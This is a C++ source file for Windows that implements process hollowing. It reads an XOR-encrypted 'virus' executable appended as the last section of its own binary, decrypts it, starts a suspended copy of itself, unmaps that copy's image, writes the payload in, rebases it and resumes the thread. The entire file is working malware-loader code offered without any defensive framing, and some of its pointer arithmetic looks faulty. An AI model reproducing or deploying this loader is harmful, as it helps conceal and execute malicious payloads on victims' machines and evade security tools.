#include <stdio.h>
#include <Windows.h>
#include <vector>
#include <winternl.h>
using namespace std;

typedef struct DOS_HEADER {             // DOS .EXE header
    WORD   e_magic;                     // Magic number
    WORD   e_cblp;                      // Bytes on last page of file
    WORD   e_cp;                        // Pages in file
    WORD   e_crlc;                      // Relocations
    WORD   e_cparhdr;                   // Size of header in paragraphs
    WORD   e_minalloc;                  // Minimum extra paragraphs needed
    WORD   e_maxalloc;                  // Maximum extra paragraphs needed
    WORD   e_ss;                        // Initial (relative) SS value
    WORD   e_sp;                        // Initial SP value
    WORD   e_csum;                      // Checksum
    WORD   e_ip;                        // Initial IP value
    WORD   e_cs;                        // Initial (relative) CS value
    WORD   e_lfarlc;                    // File address of relocation table
    WORD   e_ovno;                      // Overlay number
    WORD   e_res[4];                    // Reserved words
    WORD   e_oemid;                     // OEM identifier (for e_oeminfo)
    WORD   e_oeminfo;                   // OEM information; e_oemid specific
    WORD   e_res2[10];                  // Reserved words
    LONG   e_lfanew;                    // File address of new exe header
} __IMAGE_DOS_HEADER;

typedef struct DATA_DIRECTORY {
    DWORD VirtualAddress;
    DWORD Size;
} __IMAGE_DATA_DIRECTORY;

typedef struct FILE_HEADER {
    WORD    Machine;
    WORD    NumberOfSections;
    DWORD   TimeDateStamp;
    DWORD   PointerToSymbolTable;
    DWORD   NumberOfSymbols;
    WORD    SizeOfOptionalHeader;
    WORD    Characteristics;
} __IMAGE_FILE_HEADER;

typedef struct OPTIONAL_HEADER64 {
    WORD        Magic;
    BYTE        MajorLinkerVersion;
    BYTE        MinorLinkerVersion;
    DWORD       SizeOfCode;
    DWORD       SizeOfInitializedData;
    DWORD       SizeOfUninitializedData;
    DWORD       AddressOfEntryPoint;
    DWORD       BaseOfCode;
    ULONGLONG   ImageBase;
    DWORD       SectionAlignment;
    DWORD       FileAlignment;
    WORD        MajorOperatingSystemVersion;
    WORD        MinorOperatingSystemVersion;
    WORD        MajorImageVersion;
    WORD        MinorImageVersion;
    WORD        MajorSubsystemVersion;
    WORD        MinorSubsystemVersion;
    DWORD       Win32VersionValue;
    DWORD       SizeOfImage;
    DWORD       SizeOfHeaders;
    DWORD       CheckSum;
    WORD        Subsystem;
    WORD        DllCharacteristics;
    ULONGLONG   SizeOfStackReserve;
    ULONGLONG   SizeOfStackCommit;
    ULONGLONG   SizeOfHeapReserve;
    ULONGLONG   SizeOfHeapCommit;
    DWORD       LoaderFlags;
    DWORD       NumberOfRvaAndSizes;
    DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];
} __IMAGE_OPTIONAL_HEADER64;

typedef struct SECTION_HEADER {
    BYTE    Name[IMAGE_SIZEOF_SHORT_NAME];
    union {
        DWORD   PhysicalAddress;
        DWORD   VirtualSize;
    } Misc;
    DWORD   VirtualAddress;
    DWORD   SizeOfRawData;
    DWORD   PointerToRawData;
    DWORD   PointerToRelocations;
    DWORD   PointerToLinenumbers;
    WORD    NumberOfRelocations;
    WORD    NumberOfLinenumbers;
    DWORD   Characteristics;
} __IMAGE_SECTION_HEADER;


typedef NTSTATUS(WINAPI* __NtQueryInformationProcess)(
    HANDLE ProcessHandle,
    DWORD ProcessInformationClass,
    PVOID ProcessInformation,
    DWORD ProcessInformationLength,
    PDWORD ReturnLength
);

typedef NTSTATUS(WINAPI* __NtUnmapViewOfSection)(
    HANDLE ProcessHandle,
    PVOID BaseAddress
);


typedef struct _PEB_FREE_BLOCK {
    _PEB_FREE_BLOCK* Next;
    ULONG                   Size;
} PEB_FREE_BLOCK, * PPEB_FREE_BLOCK;

typedef void (*PPEBLOCKROUTINE)(PVOID PebLock);


typedef struct ___PEB {
    BOOLEAN                 InheritedAddressSpace;
    BOOLEAN                 ReadImageFileExecOptions;
    BOOLEAN                 BeingDebugged;
    BOOLEAN                 Spare;
    HANDLE                  Mutant;
    PVOID                   ImageBaseAddress;
    PPEB_LDR_DATA           LoaderData;
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters;
    PVOID                   SubSystemData;
    PVOID                   ProcessHeap;
    PVOID                   FastPebLock;
    PPEBLOCKROUTINE         FastPebLockRoutine;
    PPEBLOCKROUTINE         FastPebUnlockRoutine;
    ULONG                   EnvironmentUpdateCount;
    PVOID*                  KernelCallbackTable;
    PVOID                   EventLogSection;
    PVOID                   EventLog;
    PPEB_FREE_BLOCK         FreeList;
    ULONG                   TlsExpansionCounter;
    PVOID                   TlsBitmap;
    ULONG                   TlsBitmapBits[0x2];
    PVOID                   ReadOnlySharedMemoryBase;
    PVOID                   ReadOnlySharedMemoryHeap;
    PVOID*                  ReadOnlyStaticServerData;
    PVOID                   AnsiCodePageData;
    PVOID                   OemCodePageData;
    PVOID                   UnicodeCaseTableData;
    ULONG                   NumberOfProcessors;
    ULONG                   NtGlobalFlag;
    BYTE                    Spare2[0x4];
    LARGE_INTEGER           CriticalSectionTimeout;
    ULONG                   HeapSegmentReserve;
    ULONG                   HeapSegmentCommit;
    ULONG                   HeapDeCommitTotalFreeThreshold;
    ULONG                   HeapDeCommitFreeBlockThreshold;
    ULONG                   NumberOfHeaps;
    ULONG                   MaximumNumberOfHeaps;
    PVOID**                 ProcessHeaps;
    PVOID                   GdiSharedHandleTable;
    PVOID                   ProcessStarterHelper;
    PVOID                   GdiDCAttributeList;
    PVOID                   LoaderLock;
    ULONG                   OSMajorVersion;
    ULONG                   OSMinorVersion;
    ULONG                   OSBuildNumber;
    ULONG                   OSPlatformId;
    ULONG                   ImageSubSystem;
    ULONG                   ImageSubSystemMajorVersion;
    ULONG                   ImageSubSystemMinorVersion;
    ULONG                   GdiHandleBuffer[0x22];
    ULONG                   PostProcessInitRoutine;
    ULONG                   TlsExpansionBitmap;
    BYTE                    TlsExpansionBitmapBits[0x80];
    ULONG                   SessionId;
} __PEB, * __PPEB;

typedef struct _LOADED_IMAGE {
    PSTR                  ModuleName;
    HANDLE                hFile;
    PUCHAR                MappedAddress;
    PIMAGE_NT_HEADERS64   FileHeader;
    PIMAGE_SECTION_HEADER LastRvaSection;
    ULONG                 NumberOfSections;
    PIMAGE_SECTION_HEADER Sections;
    ULONG                 Characteristics;
    BOOLEAN               fSystemImage;
    BOOLEAN               fDOSImage;
    BOOLEAN               fReadOnly;
    UCHAR                 Version;
    LIST_ENTRY            Links;
    ULONG                 SizeOfImage;
} LOADED_IMAGE, * PLOADED_IMAGE;

typedef struct BASE_RELOCATION_BLOCK {
    DWORD PageAddress;
    DWORD BlockSize;
} BASE_RELOCATION_BLOCK, * PBASE_RELOCATION_BLOCK;

typedef struct BASE_RELOCATION_ENTRY {
    USHORT Offset : 12;
    USHORT Type : 4;
} BASE_RELOCATION_ENTRY, * PBASE_RELOCATION_ENTRY;

#define CountRelocationEntries(dwBlockSize)		\
	(dwBlockSize -								\
	sizeof(BASE_RELOCATION_BLOCK)) /			\
	sizeof(BASE_RELOCATION_ENTRY)

#pragma warning(disable : 4996)
int main(int argc, char* argv[]) {

    printf("Hello program2\n");

    #pragma region load ntdll and get functions

    HMODULE hNTDLL = LoadLibraryA("ntdll");
    if (!hNTDLL)
        return 1;

    FARPROC fpNtQueryInformationProcess = GetProcAddress(hNTDLL, "NtQueryInformationProcess");
    if (!fpNtQueryInformationProcess)
        return 1;

    __NtQueryInformationProcess ntQueryInformationProcess = (__NtQueryInformationProcess)fpNtQueryInformationProcess;

    FARPROC fpNtUnmapViewOfSection = GetProcAddress(hNTDLL, "NtUnmapViewOfSection");
    if (!fpNtUnmapViewOfSection)
        return 1;

    __NtUnmapViewOfSection NtUnmapViewOfSection = (__NtUnmapViewOfSection)fpNtUnmapViewOfSection;

    #pragma endregion


    #pragma region open running process and get virus section

    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);

    FILE* retrofitting = fopen(path, "rb");

    if (!retrofitting) {
        printf("error opening files\n");
        return 1;
    }

    DOS_HEADER retrofitting_dos_header;
    fread(&retrofitting_dos_header, sizeof(DOS_HEADER), 1, retrofitting);


    FILE_HEADER retrofitting_file_header;
    fseek(retrofitting, retrofitting_dos_header.e_lfanew + sizeof(DWORD), SEEK_SET);
    fread(&retrofitting_file_header, sizeof(FILE_HEADER), 1, retrofitting);
    retrofitting_file_header.NumberOfSections += 1;

    OPTIONAL_HEADER64 retrofitting_optional_header;
    fseek(retrofitting, retrofitting_dos_header.e_lfanew + sizeof(DWORD) + sizeof(FILE_HEADER), SEEK_SET);
    fread(&retrofitting_optional_header, sizeof(OPTIONAL_HEADER64), 1, retrofitting);

    SECTION_HEADER virus_section_header;
    DWORD max_virtual_address = 0;
    for (int i = 0; i < retrofitting_file_header.NumberOfSections - 1; i++) {
        SECTION_HEADER section_header;
        fread(&section_header, sizeof(SECTION_HEADER), 1, retrofitting);
        if (section_header.VirtualAddress > max_virtual_address) {
            max_virtual_address = section_header.VirtualAddress;
            virus_section_header = section_header;
        }
    }

    // seek to the start of the virus section
    DWORD virus_address = (virus_section_header.VirtualAddress - virus_section_header.VirtualAddress) + virus_section_header.PointerToRawData;
    fseek(retrofitting, virus_address, SEEK_SET);
    
    // read and decrypt virus byte by byte
    BYTE virus_byte;
    vector<BYTE> virus;
    while (fread(&virus_byte, sizeof(BYTE), 1, retrofitting)) {
 	    virus_byte = virus_byte ^ 0x40;
    	virus.push_back(virus_byte);
    }

    // read virus DOS header from virus
    DOS_HEADER virus_dos_header;
    memcpy(&virus_dos_header, virus.data(), sizeof(DOS_HEADER));

    // read virus into file header from virus
    FILE_HEADER virus_file_header;
    memcpy(&virus_file_header, virus.data() + virus_dos_header.e_lfanew + sizeof(DWORD), sizeof(FILE_HEADER));

    // read virus optional header from virus
    OPTIONAL_HEADER64 virus_optional_header;
    memcpy(&virus_optional_header, virus.data() + virus_dos_header.e_lfanew + sizeof(DWORD) + sizeof(FILE_HEADER), sizeof(OPTIONAL_HEADER64));

    vector<SECTION_HEADER> virus_sections;
    for (int i = 0; i < virus_file_header.NumberOfSections; i++) {
        SECTION_HEADER section_header;
		memcpy(&section_header, virus.data() + virus_dos_header.e_lfanew + sizeof(DWORD) + sizeof(FILE_HEADER) + sizeof(OPTIONAL_HEADER64) + (sizeof(SECTION_HEADER) * i), sizeof(SECTION_HEADER));
		virus_sections.push_back(section_header);
    }
    #pragma endregion



    // Create process in suspended form using CreateProcessA
    LPSTARTUPINFOA startup_info = new STARTUPINFOA();
    LPPROCESS_INFORMATION process_info = new PROCESS_INFORMATION();
    BOOL result = CreateProcessA(NULL, path, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, startup_info, process_info);

    if (!result) {
        printf("error creating process\n");
        return 1;
    }


    // get context of retrofitting.exe (ImageBase and OEP)
    PROCESS_BASIC_INFORMATION p_basic_info = { 0 };
    DWORD return_length = 0;
    result = ntQueryInformationProcess(process_info->hProcess, 0, &p_basic_info, sizeof(p_basic_info), &return_length);
    if (result) {
		printf("error getting process information\n");
        printf("error code: %d\n", GetLastError());
		return 1;
	}

    __PEB* p_PEB = new __PEB();
    result = ReadProcessMemory(process_info->hProcess, (LPCVOID)p_basic_info.PebBaseAddress, p_PEB, sizeof(PEB), NULL);
    if (!result) {
        printf("error reading process memory at PebBaseAddress\n");
        printf("error code: %d\n", GetLastError());
        return 1;
    }


    /*BYTE* lp_buffer = new BYTE[0x2000];
    result = ReadProcessMemory(process_info->hProcess, p_PEB->ImageBaseAddress, lp_buffer, sizeof(lp_buffer), nullptr);
    if (!result) {
        delete[] lp_buffer;
        printf("error reading process memory at process ImageBaseAddress\n");
        return 1;
    }


    PIMAGE_DOS_HEADER p_dos_header = (PIMAGE_DOS_HEADER)lp_buffer;
    PLOADED_IMAGE p_image = new LOADED_IMAGE();

    p_image->FileHeader = (PIMAGE_NT_HEADERS64)(lp_buffer + p_dos_header->e_lfanew);
    p_image->NumberOfSections = p_image->FileHeader->FileHeader.NumberOfSections;
    p_image->Sections = (PIMAGE_SECTION_HEADER)(lp_buffer + p_dos_header->e_lfanew + sizeof(IMAGE_NT_HEADERS64));

    delete[] lp_buffer;*/


    // Clear space using NtUnmapViewOfSection
    DWORD unmap_result = NtUnmapViewOfSection(process_info->hProcess, p_PEB->ImageBaseAddress);
    if (unmap_result) {
        printf("error unmapping view of section\n");
        return 1;
    }

    // Allocate space using VirtualAllocEx at ImageBase of virus
    PVOID p_remote_image = VirtualAllocEx(process_info->hProcess, p_PEB->ImageBaseAddress, virus_optional_header.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!p_remote_image) {
    printf("error allocating space\n");
    return 1;
    }

    DWORD d = (DWORD)p_PEB->ImageBaseAddress - virus_optional_header.ImageBase;

    printf("Relocation delta: 0x%p\r\n", d);

    // Copy headers to remote process using WriteProcessMemory
    virus_optional_header.ImageBase = (DWORD)p_PEB->ImageBaseAddress;
    memcpy(&virus[virus_dos_header.e_lfanew + sizeof(DWORD) + sizeof(FILE_HEADER)], &virus_optional_header, sizeof(OPTIONAL_HEADER64));

    result = WriteProcessMemory(process_info->hProcess, p_PEB->ImageBaseAddress, virus.data(), virus_optional_header.SizeOfHeaders, 0);
    if (!result) {
        printf("error writing process memory - headers\n");
        printf("error code: %d\n", GetLastError());
		return 1;
    }

    // If successful stretch vrius and copy into space using WriteProcessMemory

    for (DWORD i = 0; i < virus_file_header.NumberOfSections; i++)
    {
        if (!virus_sections[i].PointerToRawData)
            continue;

        PVOID section_dest = (PVOID)((DWORD)p_PEB->ImageBaseAddress + virus_sections[i].VirtualAddress);

        printf("Writing %s section to 0x%p\r\n", virus_sections[i].Name, section_dest);
        vector<BYTE> section_data;
        section_data.resize(virus_sections[i].SizeOfRawData);
        memcpy(section_data.data(), &virus[virus_sections[i].PointerToRawData], virus_sections[i].SizeOfRawData);

        result = WriteProcessMemory(process_info->hProcess, section_dest, section_data.data(), virus_sections[i].SizeOfRawData, 0);
        if (!result) {
			printf("error writing process memory - section %d\n", i);
			printf("error code: %d\n", GetLastError());
			//return 1;
		}
    }

    // Modify context of retorfitting to ImageBase of virus and OEP of virus
    if (d)
        for (DWORD i = 0; i < virus_file_header.NumberOfSections; i++)
        {
            const char* section_name = ".reloc";

            if (memcmp(virus_sections[i].Name, section_name, strlen(section_name)))
                continue;

            printf("Rebasing image\r\n");

            DWORD reloc_address = virus_sections[i].PointerToRawData;
            DWORD offset = 0;

            DATA_DIRECTORY reloc_data = virus_optional_header.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

            while (offset < reloc_data.Size)
            {
                PBASE_RELOCATION_BLOCK block_header = (PBASE_RELOCATION_BLOCK)&virus[reloc_address + offset];

                offset += sizeof(BASE_RELOCATION_BLOCK);

                DWORD entry_count = CountRelocationEntries(block_header->BlockSize);

                PBASE_RELOCATION_ENTRY blocks = (PBASE_RELOCATION_ENTRY)&virus[reloc_address + offset];

                for (DWORD j = 0; j < entry_count; j++)
                {
                    offset += sizeof(BASE_RELOCATION_ENTRY);

                    if (blocks[j].Type == 0)
                        continue;

                    DWORD field_address = block_header->PageAddress + blocks[j].Offset;

                    DWORD buffer = 0;
                    ReadProcessMemory(process_info->hProcess, (PVOID)((DWORD)p_PEB->ImageBaseAddress + field_address), &buffer, sizeof(DWORD),0);
                    buffer += d;

                    result = WriteProcessMemory(process_info->hProcess,(PVOID)((DWORD)p_PEB->ImageBaseAddress + field_address),&buffer,sizeof(DWORD),0);
                    if (!result)
                    {
                        printf("error writing memory - relocations\n");
                        printf("error code: %d\r\n", GetLastError());
                        continue;
                    }
                }
            }

            break;
        }

    // Set the ConContext tact and restore the main thread
    DWORD entry_point = (DWORD)p_PEB->ImageBaseAddress + virus_optional_header.AddressOfEntryPoint;

    LPCONTEXT context = new CONTEXT();
    context->ContextFlags = CONTEXT_INTEGER;

    printf("Getting thread context\r\n");

    result = GetThreadContext(process_info->hThread, context);
    if (!result)
    {
		printf("error getting context\r\n");
        printf("error code: %d\r\n", GetLastError());
		return 1;
	}

    context->Rax = entry_point;

    printf("Setting thread context\r\n");
    result = SetThreadContext(process_info->hThread, context);
    if (!result)
    {
        printf("error setting context\r\n");
		printf("error code: %d\r\n", GetLastError());
        return 1;
    }

    printf("Resuming thread\r\n");
    result = ResumeThread(process_info->hThread);
    if (!result)
    {
        printf("error resuming thread\r\n");
        printf("error code: %d\r\n", GetLastError());
        return 1;
    }

    printf("Process hollowing complete\r\n");


    fclose(retrofitting);

    return 0;
}

